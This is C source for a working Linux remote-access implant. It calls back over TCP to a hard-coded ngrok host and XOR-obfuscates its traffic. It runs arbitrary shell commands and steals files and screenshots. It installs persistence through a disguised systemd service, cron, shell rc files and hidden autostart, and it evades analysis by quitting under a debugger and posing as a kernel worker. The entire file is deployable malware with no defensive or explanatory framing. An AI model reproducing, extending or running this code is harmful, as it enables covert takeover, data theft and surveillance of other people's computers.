/*
 * pay_linux.c — Linux C2 Implant
 * Protocol: XOR(0x3A) + HexEncode over TCP
 * Compatible with pythonlis.py / web_listener.py
 *
 * Build:
 *   gcc -o payload pay_linux.c -lX11 -lpthread -lcrypt -O2 -s
 *   # without X11 screenshot support:
 *   gcc -o payload pay_linux.c -lpthread -lcrypt -O2 -s -DNO_X11
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <dirent.h>
#include <pwd.h>
#include <grp.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <pthread.h>
#include <dlfcn.h>
#include <sys/syscall.h>

#ifndef NO_X11
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#endif

/* ───────── crypto / encode ───────── */

#define KEY 0x3A

static void xor_buf(unsigned char *data, size_t len) {
    for (size_t i = 0; i < len; i++) data[i] ^= KEY;
}

static void hex_encode(const unsigned char *in, char *out, size_t in_len) {
    static const char hex[] = "0123456789ABCDEF";
    for (size_t i = 0; i < in_len; i++) {
        out[i*2]   = hex[(in[i] >> 4) & 0xF];
        out[i*2+1] = hex[in[i] & 0xF];
    }
    out[in_len*2] = 0;
}

static int hex_decode(const char *in, unsigned char *out) {
    size_t len = strlen(in) / 2;
    char buf[3] = {0};
    for (size_t i = 0; i < len; i++) {
        buf[0] = in[i*2]; buf[1] = in[i*2+1];
        out[i] = (unsigned char)strtol(buf, NULL, 16);
    }
    out[len] = 0;
    return (int)len;
}

static void trim(char *s) {
    size_t l = strlen(s);
    while (l > 0 && (s[l-1] == '\n' || s[l-1] == '\r' || s[l-1] == ' '))
        s[--l] = 0;
}

/* ───────── base64 (via openssl or internal) ───────── */

static const char b64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int b64_encode(const unsigned char *in, size_t in_len, char **out) {
    size_t out_len = 4 * ((in_len + 2) / 3) + 1;
    *out = calloc(1, out_len);
    if (!*out) return -1;
    size_t i, j = 0;
    for (i = 0; i < in_len; i += 3) {
        unsigned a = in[i];
        unsigned b = i+1 < in_len ? in[i+1] : 0;
        unsigned c = i+2 < in_len ? in[i+2] : 0;
        (*out)[j++] = b64_table[a >> 2];
        (*out)[j++] = b64_table[((a & 3) << 4) | (b >> 4)];
        (*out)[j++] = i+1 < in_len ? b64_table[((b & 0xF) << 2) | (c >> 6)] : '=';
        (*out)[j++] = i+2 < in_len ? b64_table[c & 0x3F] : '=';
    }
    (*out)[j] = 0;
    return 0;
}

static int b64_char_val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static int b64_decode(const char *in, unsigned char **out, size_t *out_len) {
    size_t in_len = strlen(in);
    if (in_len % 4 != 0) return -1;
    size_t olen = in_len / 4 * 3;
    if (in[in_len-1] == '=') olen--;
    if (in[in_len-2] == '=') olen--;
    *out = calloc(1, olen + 1);
    if (!*out) return -1;

    size_t i, j = 0;
    for (i = 0; i < in_len; i += 4) {
        int a = b64_char_val(in[i]);
        int b = b64_char_val(in[i+1]);
        int c = b64_char_val(in[i+2]);
        int d = b64_char_val(in[i+3]);
        if (a < 0 || b < 0) { free(*out); *out = NULL; return -1; }
        unsigned triple = ((unsigned)a << 18) | ((unsigned)b << 12) | ((unsigned)(c & 0x3F) << 6) | (unsigned)(d & 0x3F);
        (*out)[j++] = (triple >> 16) & 0xFF;
        if (c >= 0) (*out)[j++] = (triple >> 8) & 0xFF;
        if (d >= 0) (*out)[j++] = triple & 0xFF;
    }
    *out_len = olen;
    return 0;
}

/* ───────── global state ───────── */

static char current_dir[4096];
static char *self_path = NULL;              /* argv[0] copy for re-invocation */
static int  daemonized = 0;

/* ───────── helpers ───────── */

static void run_shell(const char *cmd, char *out, size_t out_sz) {
    char full[8192];
    snprintf(full, sizeof(full), "%s 2>&1", cmd);

    FILE *fp = popen(full, "r");
    if (!fp) {
        snprintf(out, out_sz, "popen() failed: %s\r\n", strerror(errno));
        return;
    }
    size_t pos = 0;
    char buf[1024];
    while (fgets(buf, sizeof(buf), fp)) {
        size_t n = strlen(buf);
        if (pos + n >= out_sz - 2) break;
        memcpy(out + pos, buf, n);
        pos += n;
    }
    int rc = pclose(fp);
    if (pos == 0) {
        snprintf(out, out_sz, "Command completed (exit: %d)\r\n", rc);
        pos = strlen(out);
    }
    out[pos] = 0;
}

static void cmd_ls(const char *path, char *out, size_t out_sz) {
    const char *dir = (path && *path) ? path : current_dir;
    DIR *d = opendir(dir);
    if (!d) {
        snprintf(out, out_sz, "Error: cannot open '%s': %s\r\n", dir, strerror(errno));
        return;
    }
    size_t pos = 0;
    pos += snprintf(out + pos, out_sz - pos, "Directory listing: %s\r\n", dir);
    pos += snprintf(out + pos, out_sz - pos, "%-30s %-12s %s\r\n", "Name", "Size", "Type");
    pos += snprintf(out + pos, out_sz - pos, "%.80s\r\n",
                    "-------------------------------------------------------------");

    struct dirent *e;
    while ((e = readdir(d)) != NULL) {
        if (e->d_name[0] == '.' && (!e->d_name[1] || (e->d_name[1] == '.' && !e->d_name[2])))
            continue;

        char full[8192];
        snprintf(full, sizeof(full), "%s/%s", dir, e->d_name);
        struct stat st;
        char size_str[32] = "-";
        const char *type = "    ";
        if (stat(full, &st) == 0) {
            if (S_ISDIR(st.st_mode)) type = "<DIR>";
            else if (S_ISLNK(st.st_mode)) type = "<LNK>";
            else snprintf(size_str, sizeof(size_str), "%lld", (long long)st.st_size);
        }
        pos += snprintf(out + pos, out_sz - pos, "%-30s %-12s %s\r\n", e->d_name, size_str, type);
        if (pos >= out_sz - 128) break;
    }
    closedir(d);
    out[pos] = 0;
}

static void cmd_download(const char *path, char *out, size_t out_sz) {
    FILE *f = fopen(path, "rb");
    if (!f) {
        snprintf(out, out_sz, "Error: cannot open '%s': %s\r\n", path, strerror(errno));
        return;
    }
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    if (fsize <= 0 || fsize > 10*1024*1024) {
        fclose(f);
        snprintf(out, out_sz, "Error: file empty or too large (>10MB)\r\n");
        return;
    }
    rewind(f);
    unsigned char *buf = malloc(fsize);
    if (!buf) { fclose(f); snprintf(out, out_sz, "Error: OOM\r\n"); return; }
    size_t read = fread(buf, 1, fsize, f);
    fclose(f);

    char *b64 = NULL;
    if (b64_encode(buf, read, &b64) != 0) {
        free(buf);
        snprintf(out, out_sz, "Error: b64 encode failed\r\n");
        return;
    }
    free(buf);
    snprintf(out, out_sz, "[DOWNLOAD]%s|%s", path, b64);
    free(b64);
}

static void cmd_upload(const char *arg, char *out, size_t out_sz) {
    const char *sep = strchr(arg, '|');
    if (!sep) {
        snprintf(out, out_sz, "Error: invalid format. Use: <path>|<base64>\r\n");
        return;
    }
    char path[4096];
    size_t plen = sep - arg;
    if (plen >= sizeof(path)) plen = sizeof(path) - 1;
    memcpy(path, arg, plen);
    path[plen] = 0;

    unsigned char *dec = NULL;
    size_t dlen = 0;
    if (b64_decode(sep + 1, &dec, &dlen) != 0 || !dec) {
        snprintf(out, out_sz, "Error: base64 decode failed\r\n");
        return;
    }
    FILE *f = fopen(path, "wb");
    if (!f) {
        free(dec);
        snprintf(out, out_sz, "Error: cannot write '%s': %s\r\n", path, strerror(errno));
        return;
    }
    fwrite(dec, 1, dlen, f);
    fclose(f);
    free(dec);
    snprintf(out, out_sz, "Uploaded %zu bytes to %s\r\n", dlen, path);
}

static void cmd_ps(char *out, size_t out_sz) {
    size_t pos = 0;
    pos += snprintf(out + pos, out_sz - pos, "%-8s %-6s %-8s %s\r\n", "PID", "PPID", "STATE", "CMD");
    pos += snprintf(out + pos, out_sz - pos, "%.70s\r\n",
                    "----------------------------------------------------------------------");

    DIR *d = opendir("/proc");
    if (!d) { snprintf(out, out_sz, "Error: cannot open /proc\r\n"); return; }

    struct dirent *e;
    while ((e = readdir(d)) != NULL) {
        if (e->d_name[0] < '0' || e->d_name[0] > '9') continue;
        char p[320];
        snprintf(p, sizeof(p), "/proc/%s/stat", e->d_name);
        FILE *f = fopen(p, "r");
        if (!f) continue;
        int pid, ppid;
        char state;
        char comm[256];
        if (fscanf(f, "%d (%255[^)]) %c %d", &pid, comm, &state, &ppid) >= 4) {
            pos += snprintf(out + pos, out_sz - pos, "%-8d %-6d %-8c %s\r\n", pid, ppid, state, comm);
        }
        fclose(f);
        if (pos >= out_sz - 128) break;
    }
    closedir(d);
    out[pos] = 0;
}

static void cmd_kill(const char *pid_str, char *out, size_t out_sz) {
    long pid = atol(pid_str);
    if (pid <= 0) {
        snprintf(out, out_sz, "Error: invalid PID\r\n");
        return;
    }
    if (kill((pid_t)pid, SIGKILL) == 0)
        snprintf(out, out_sz, "Process %ld killed\r\n", pid);
    else
        snprintf(out, out_sz, "Error: kill(%ld): %s\r\n", pid, strerror(errno));
}

#ifndef NO_X11
static void cmd_screenshot(char *out, size_t out_sz) {
    Display *dpy = XOpenDisplay(NULL);
    if (!dpy) {
        snprintf(out, out_sz, "Error: cannot open X display\r\n");
        return;
    }
    int screen = DefaultScreen(dpy);
    Window root = RootWindow(dpy, screen);
    int w = DisplayWidth(dpy, screen);
    int h = DisplayHeight(dpy, screen);

    XImage *img = XGetImage(dpy, root, 0, 0, w, h, AllPlanes, ZPixmap);
    if (!img) {
        XCloseDisplay(dpy);
        snprintf(out, out_sz, "Error: XGetImage failed\r\n");
        return;
    }

    /* Write as BMP (24-bit, bottom-up) */
    int row_size = ((w * 24 + 31) / 32) * 4;
    int data_size = row_size * h;
    int total_size = 14 + 40 + data_size;  /* file header + info header + pixels */
    unsigned char *bmp = calloc(1, total_size);
    if (!bmp) {
        XDestroyImage(img);
        XCloseDisplay(dpy);
        snprintf(out, out_sz, "Error: OOM\r\n");
        return;
    }

    /* BITMAPFILEHEADER */
    bmp[0] = 'B'; bmp[1] = 'M';
    *(uint32_t*)(bmp+2) = total_size;
    *(uint32_t*)(bmp+10) = 14 + 40;

    /* BITMAPINFOHEADER */
    *(uint32_t*)(bmp+14) = 40;        /* header size */
    *(int32_t*)(bmp+18)   = w;
    *(int32_t*)(bmp+22)   = -h;       /* negative = top-down */
    *(uint16_t*)(bmp+26)  = 1;        /* planes */
    *(uint16_t*)(bmp+28)  = 24;       /* bpp */
    *(uint32_t*)(bmp+34)  = data_size;

    /* Convert XImage (32-bit ARGB) to 24-bit BGR */
    for (int y = 0; y < h; y++) {
        for (int x = 0; x < w; x++) {
            unsigned long px = XGetPixel(img, x, y);
            int off = 14 + 40 + y * row_size + x * 3;
            bmp[off+0] = (px >> 0) & 0xFF;       /* B */
            bmp[off+1] = (px >> 8) & 0xFF;       /* G */
            bmp[off+2] = (px >> 16) & 0xFF;      /* R */
        }
    }

    char *b64 = NULL;
    if (b64_encode(bmp, total_size, &b64) != 0) {
        free(bmp); XDestroyImage(img); XCloseDisplay(dpy);
        snprintf(out, out_sz, "Error: b64 encode failed\r\n");
        return;
    }
    free(bmp);
    XDestroyImage(img);
    XCloseDisplay(dpy);

    snprintf(out, out_sz, "[SCREENSHOT]%dx%d|%s", w, h, b64);
    free(b64);
}
#else
static void cmd_screenshot(char *out, size_t out_sz) {
    /* fallback: try `import` (ImageMagick) or `gnome-screenshot` */
    FILE *fp = popen("import -window root png:- 2>/dev/null | base64 -w0", "r");
    if (!fp) {
        snprintf(out, out_sz, "Error: no screenshot method available\r\n");
        return;
    }
    char b64[1048576];
    size_t n = fread(b64, 1, sizeof(b64)-1, fp);
    int rc = pclose(fp);
    b64[n] = 0;
    trim(b64);
    if (rc != 0 || n == 0) {
        snprintf(out, out_sz, "Error: screenshot failed\r\n");
        return;
    }
    snprintf(out, out_sz, "[SCREENSHOT]0x0|%s", b64);
}
#endif

static void cmd_sysinfo(char *out, size_t out_sz) {
    struct utsname uts;
    uname(&uts);

    char hostname[256] = {0};
    gethostname(hostname, sizeof(hostname)-1);

    /* CPU info */
    char cpu_model[256] = "unknown";
    FILE *f = fopen("/proc/cpuinfo", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "model name", 10) == 0) {
                char *c = strchr(line, ':');
                if (c) { strncpy(cpu_model, c+2, sizeof(cpu_model)-1); trim(cpu_model); }
                break;
            }
        }
        fclose(f);
    }

    /* Memory */
    long mem_total = 0, mem_avail = 0;
    f = fopen("/proc/meminfo", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (sscanf(line, "MemTotal: %ld kB", &mem_total) == 1) continue;
            if (sscanf(line, "MemAvailable: %ld kB", &mem_avail) == 1) continue;
        }
        fclose(f);
    }

    /* CPU cores */
    long cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);

    /* Uptime */
    double uptime_secs = 0;
    f = fopen("/proc/uptime", "r");
    if (f) { fscanf(f, "%lf", &uptime_secs); fclose(f); }

    /* Get user */
    const char *user = "unknown";
    struct passwd *pw = getpwuid(getuid());
    if (pw) user = pw->pw_name;

    /* IP (first non-loopback) */
    char ip_str[64] = "N/A";
    FILE *ipf = popen("ip -4 addr show | grep -oP 'inet \\K[\\d.]+' | grep -v ^127 | head -1", "r");
    if (ipf) {
        if (fgets(ip_str, sizeof(ip_str), ipf)) trim(ip_str);
        pclose(ipf);
    }

    size_t pos = 0;
    pos += snprintf(out + pos, out_sz - pos, "System Information\r\n");
    pos += snprintf(out + pos, out_sz - pos, "%.80s\r\n", "========================================");
    pos += snprintf(out + pos, out_sz - pos, "Hostname      : %s\r\n", hostname);
    pos += snprintf(out + pos, out_sz - pos, "User          : %s\r\n", user);
    pos += snprintf(out + pos, out_sz - pos, "OS            : %s %s %s\r\n", uts.sysname, uts.release, uts.machine);
    pos += snprintf(out + pos, out_sz - pos, "CPU           : %s\r\n", cpu_model);
    pos += snprintf(out + pos, out_sz - pos, "CPU Cores     : %ld\r\n", cpu_cores);
    pos += snprintf(out + pos, out_sz - pos, "Memory Total  : %.1f GB\r\n", mem_total / (1024.0 * 1024.0));
    pos += snprintf(out + pos, out_sz - pos, "Memory Avail  : %.1f GB\r\n", mem_avail / (1024.0 * 1024.0));
    pos += snprintf(out + pos, out_sz - pos, "Uptime        : %.0f hours\r\n", uptime_secs / 3600.0);
    pos += snprintf(out + pos, out_sz - pos, "IP Address    : %s\r\n", ip_str);
    pos += snprintf(out + pos, out_sz - pos, "Working Dir   : %s\r\n", current_dir);
    out[pos] = 0;
}

/* ───────── persistence ───────── */

static void persist_systemd(const char *exe, char *out, size_t out_sz) {
    const char *home = getenv("HOME");
    if (!home) { snprintf(out, out_sz, "Error: no HOME\r\n"); return; }

    char service_path[4096];
    snprintf(service_path, sizeof(service_path),
             "%s/.config/systemd/user/", home);
    mkdir(service_path, 0755);

    snprintf(service_path, sizeof(service_path),
             "%s/.config/systemd/user/.dbus.service", home);

    FILE *f = fopen(service_path, "w");
    if (!f) {
        snprintf(out, out_sz, "Error: cannot write %s\r\n", service_path);
        return;
    }
    fprintf(f,
        "[Unit]\n"
        "Description=D-Bus User Service\n"
        "\n"
        "[Service]\n"
        "ExecStart=%s\n"
        "Restart=always\n"
        "RestartSec=30\n"
        "\n"
        "[Install]\n"
        "WantedBy=default.target\n",
        exe);
    fclose(f);

    /* enable & start */
    char cmd[8192];
    snprintf(cmd, sizeof(cmd),
             "systemctl --user enable .dbus.service 2>/dev/null; "
             "systemctl --user start .dbus.service 2>/dev/null");
    system(cmd);

    snprintf(out, out_sz, "Systemd user service installed: %s\r\n", service_path);
}

static void persist_cron(const char *exe, char *out, size_t out_sz) {
    char cmd[8192];
    snprintf(cmd, sizeof(cmd),
             "(crontab -l 2>/dev/null | grep -v '%s'; echo '*/5 * * * * %s') | crontab -",
             exe, exe);
    system(cmd);
    snprintf(out, out_sz, "Cron persistence installed (every 5 min)\r\n");
}

static void persist_bashrc(const char *exe, char *out, size_t out_sz) {
    const char *home = getenv("HOME");
    if (!home) { snprintf(out, out_sz, "Error: no HOME\r\n"); return; }

    const char *files[] = {".bashrc", ".profile", ".zshrc", NULL};
    for (int i = 0; files[i]; i++) {
        char p[4096];
        snprintf(p, sizeof(p), "%s/%s", home, files[i]);
        FILE *f = fopen(p, "a");
        if (f) {
            fprintf(f, "\n# ---\n[ -x %s ] && nohup %s >/dev/null 2>&1 &\n# ---\n", exe, exe);
            fclose(f);
        }
    }
    snprintf(out, out_sz, "Shell rc persistence installed\r\n");
}

static void persist_autostart(const char *exe, char *out, size_t out_sz) {
    const char *home = getenv("HOME");
    if (!home) { snprintf(out, out_sz, "Error: no HOME\r\n"); return; }

    char dir[4096], path[4096];
    snprintf(dir, sizeof(dir), "%s/.config/autostart", home);
    mkdir(dir, 0755);
    snprintf(path, sizeof(path), "%s/.config/autostart/.system-tray.desktop", home);

    FILE *f = fopen(path, "w");
    if (!f) { snprintf(out, out_sz, "Error: cannot write %s\r\n", path); return; }
    fprintf(f,
        "[Desktop Entry]\n"
        "Type=Application\n"
        "Name=System Tray\n"
        "Exec=%s\n"
        "X-GNOME-Autostart-enabled=true\n"
        "NoDisplay=true\n"
        "Terminal=false\n",
        exe);
    fclose(f);
    snprintf(out, out_sz, "XDG autostart installed: %s\r\n", path);
}

static void cmd_persist(const char *arg, char *out, size_t out_sz) {
    (void)arg;
    /* Try to get absolute path of our binary */
    char exe[4096] = {0};
    if (self_path && self_path[0] == '/') {
        snprintf(exe, sizeof(exe), "%s", self_path);
    } else {
        char proc_exe[64];
        snprintf(proc_exe, sizeof(proc_exe), "/proc/self/exe");
        ssize_t n = readlink(proc_exe, exe, sizeof(exe)-1);
        if (n == -1) {
            /* fallback: copy to a hidden location */
            const char *home = getenv("HOME");
            if (home) {
                snprintf(exe, sizeof(exe), "%s/.cache/.systemd-boot", home);
                char src[4096] = {0};
                if (self_path) snprintf(src, sizeof(src), "%s", self_path);
                else readlink("/proc/self/exe", src, sizeof(src)-1);
                if (src[0]) {
                    FILE *sf = fopen(src, "rb");
                    if (sf) {
                        FILE *df = fopen(exe, "wb");
                        if (df) {
                            char buf[8192]; size_t r;
                            while ((r = fread(buf, 1, sizeof(buf), sf)) > 0)
                                fwrite(buf, 1, r, df);
                            fclose(df);
                            chmod(exe, 0755);
                        }
                        fclose(sf);
                    }
                }
            }
        } else {
            exe[n] = 0;
        }
    }

    if (!exe[0] || access(exe, X_OK) != 0) {
        snprintf(out, out_sz, "Error: cannot locate self binary\r\n");
        return;
    }

    persist_systemd(exe, out, out_sz);
    size_t pos = strlen(out);
    persist_cron(exe, out + pos, out_sz - pos);
    pos = strlen(out);
    persist_bashrc(exe, out + pos, out_sz - pos);
    pos = strlen(out);
    persist_autostart(exe, out + pos, out_sz - pos);
}

/* ───────── anti-analysis ───────── */

static int detect_ptrace() {
    /* Try to ptrace ourselves — if it fails, we're being traced */
    int rc = 0;
    void *handle = dlopen("libc.so.6", RTLD_LAZY);
    if (!handle) return 0;
    long (*ptrace_ptr)(int, ...) = dlsym(handle, "ptrace");
    if (!ptrace_ptr) { dlclose(handle); return 0; }

    long ret = ptrace_ptr(0, 0, 0, 0);  /* PTRACE_TRACEME */
    if (ret == -1) rc = 1;  /* being traced */
    dlclose(handle);
    return rc;
}

static void rename_argv(int argc, char **argv) {
    /* Overwrite argv to hide our name */
    const char *fake = "[kworker/0:0]";
    for (int i = 0; i < argc; i++) {
        size_t n = strlen(argv[i]);
        memset(argv[i], 0, n);
        if (i == 0) {
            strncpy(argv[i], fake, n);
        }
    }
    /* Also overwrite environ pointers if we can */
    extern char **environ;
    if (environ) {
        for (size_t i = 0; environ[i]; i++) {
            memset(environ[i], 0, strlen(environ[i]));
        }
    }
    /* prctl(PR_SET_NAME, "kworker/0:0") — not strictly necessary but helps */
    /* prctl(15, fake, 0, 0, 0); — PR_SET_NAME = 15 (on Linux) */
    /* Using syscall directly */
    syscall(157, fake, 0, 0, 0, 0);  /* prctl on x64 = 157 */
}

static void daemonize() {
    if (daemonized) return;
    pid_t pid = fork();
    if (pid < 0) return;
    if (pid > 0) _exit(0);  /* parent dies */

    /* Child: new session */
    setsid();

    /* Fork again to fully detach */
    pid = fork();
    if (pid < 0) _exit(0);
    if (pid > 0) _exit(0);

    /* Close stdio */
    close(0); close(1); close(2);
    open("/dev/null", O_RDONLY);
    open("/dev/null", O_WRONLY);
    open("/dev/null", O_WRONLY);

    daemonized = 1;
}

/* ───────── command dispatch ───────── */

static void process_command(const char *cmd, char *out, size_t out_sz) {
    out[0] = 0;

    if (strncmp(cmd, "!shell ", 7) == 0) {
        run_shell(cmd + 7, out, out_sz);
    } else if (strncmp(cmd, "!cd ", 4) == 0) {
        const char *dir = cmd + 4;
        if (chdir(dir) == 0) {
            getcwd(current_dir, sizeof(current_dir));
            snprintf(out, out_sz, "Changed to: %s\r\n", current_dir);
        } else {
            snprintf(out, out_sz, "Error: cannot change to '%s': %s\r\n", dir, strerror(errno));
        }
    } else if (strcmp(cmd, "!pwd") == 0) {
        snprintf(out, out_sz, "%s\r\n", current_dir);
    } else if (strncmp(cmd, "!ls", 3) == 0) {
        const char *p = cmd + 3;
        while (*p == ' ') p++;
        cmd_ls(p, out, out_sz);
    } else if (strncmp(cmd, "!download ", 10) == 0) {
        cmd_download(cmd + 10, out, out_sz);
    } else if (strncmp(cmd, "!upload ", 8) == 0) {
        cmd_upload(cmd + 8, out, out_sz);
    } else if (strcmp(cmd, "!ps") == 0) {
        cmd_ps(out, out_sz);
    } else if (strncmp(cmd, "!kill ", 6) == 0) {
        cmd_kill(cmd + 6, out, out_sz);
    } else if (strcmp(cmd, "!screenshot") == 0) {
        cmd_screenshot(out, out_sz);
    } else if (strcmp(cmd, "!sysinfo") == 0) {
        cmd_sysinfo(out, out_sz);
    } else if (strcmp(cmd, "!persist") == 0) {
        cmd_persist(NULL, out, out_sz);
    } else if (strcmp(cmd, "!help") == 0 || strcmp(cmd, "help") == 0) {
        snprintf(out, out_sz,
            "Available commands:\r\n"
            "  !shell <cmd>       Execute shell command (or type directly)\r\n"
            "  !cd <dir>          Change directory\r\n"
            "  !pwd               Print working directory\r\n"
            "  !ls <path>         List directory\r\n"
            "  !download <path>   Download file\r\n"
            "  !upload <path>     Upload file (with embedded base64)\r\n"
            "  !ps                List processes\r\n"
            "  !kill <pid>        Kill process\r\n"
            "  !screenshot        Take screenshot (via X11)\r\n"
            "  !sysinfo           System information\r\n"
            "  !persist           Install persistence (systemd/cron/bashrc/autostart)\r\n"
            "  !exit              Disconnect\r\n"
            "  !help              Show this help\r\n"
            "Commands without '!' are executed via sh -c\r\n");
    } else if (strcmp(cmd, "!exit") == 0) {
        out[0] = 0;  /* signal exit */
    } else {
        run_shell(cmd, out, out_sz);
    }
}

/* ───────── network client ───────── */

static void c2_loop(const char *host, int port) {
    const size_t result_sz = 16 * 1024 * 1024;
    const size_t hex_sz    = 32 * 1024 * 1024;
    char recv_buf[4096], cmd_buf[4096];
    char *result = malloc(result_sz);
    char *hex_buf = malloc(hex_sz + 2);
    if (!result || !hex_buf) {
        free(result); free(hex_buf);
        return;
    }

    while (1) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) { sleep(5); continue; }

        struct hostent *remote = gethostbyname(host);
        if (!remote) { close(sock); sleep(5); continue; }

        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        memcpy(&server.sin_addr, remote->h_addr_list[0], remote->h_length);

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
            close(sock);
            sleep(5);
            continue;
        }

        while (1) {
            memset(recv_buf, 0, sizeof(recv_buf));
            memset(cmd_buf, 0, sizeof(cmd_buf));
            memset(result, 0, result_sz);
            memset(hex_buf, 0, hex_sz + 2);

            int n = recv(sock, recv_buf, sizeof(recv_buf) - 1, 0);
            if (n <= 0) break;
            trim(recv_buf);

            int dlen = hex_decode(recv_buf, (unsigned char*)cmd_buf);
            if (dlen <= 0) continue;
            xor_buf((unsigned char*)cmd_buf, dlen);
            trim(cmd_buf);

            if (strcmp(cmd_buf, "!exit") == 0)
                break;

            process_command(cmd_buf, result, result_sz);

            size_t rlen = strlen(result);
            if (rlen > 0) {
                xor_buf((unsigned char*)result, rlen);
                hex_encode((unsigned char*)result, hex_buf, rlen);
                int hlen = strlen(hex_buf);
                hex_buf[hlen] = '\n';
                int slen = hlen + 1;
                int total = 0;
                while (total < slen) {
                    int s = send(sock, hex_buf + total, slen - total, 0);
                    if (s <= 0) break;
                    total += s;
                }
            }
        }
        close(sock);
        sleep(5);
    }
    free(result);
    free(hex_buf);
}

/* ───────── entry ───────── */

int main(int argc, char **argv) {
    /* Save path */
    if (argc > 0 && argv[0]) {
        self_path = strdup(argv[0]);
    }

    /* Get CWD */
    getcwd(current_dir, sizeof(current_dir));

    /* Ptrace anti-debug check */
    if (detect_ptrace()) {
        /* Exit silently if traced */
        return 0;
    }

    /* Daemonize */
    daemonize();

    /* Rename argv */
    rename_argv(argc, argv);

    /* Configurable host/port from env or defaults */
    const char *host = getenv("C2_HOST") ? getenv("C2_HOST") : "0.tcp.in.ngrok.io";
    int port = 24754;
    if (getenv("C2_PORT")) port = atoi(getenv("C2_PORT"));
    if (port <= 0) port = 7777;

    /* If first arg looks like an IP/hostname, use it */
    if (argc > 1 && strchr(argv[1], '.')) {
        host = argv[1];
        if (argc > 2) port = atoi(argv[2]);
        if (port <= 0) port = 7777;
    }

    c2_loop(host, port);
    return 0;
}
